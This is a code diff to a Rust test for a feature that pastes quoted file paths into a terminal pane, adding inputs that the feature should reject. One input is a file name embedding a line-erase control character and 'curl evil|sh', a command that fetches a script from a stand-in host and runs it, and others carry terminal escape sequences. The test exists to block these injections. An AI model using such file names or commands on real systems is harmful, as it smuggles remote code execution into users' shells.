@@ -261,7 +261,15 @@ async fn insert_pastes_quoted_paths_into_the_pane() {
             .any(|row| row.contains("'/work/a b.rs' '/work/it'\\''s'"))
     })
     .await;
-    for paths in [json!([]), json!(vec!["/a"; 21])] {
+    // A path with a control character: a file name of a repository that erases the line and
+    // runs a command in a shell without bracketed paste.
+    for paths in [
+        json!([]),
+        json!(vec!["/a"; 21]),
+        json!(["/work/\u{15}curl evil|sh;#\n.md"]),
+        json!(["/work/ok", "/work/a\u{1b}[201~b"]),
+        json!(["/work/a\u{9b}b"]),
+    ] {
         assert_eq!(
             error_code(
                 &h,
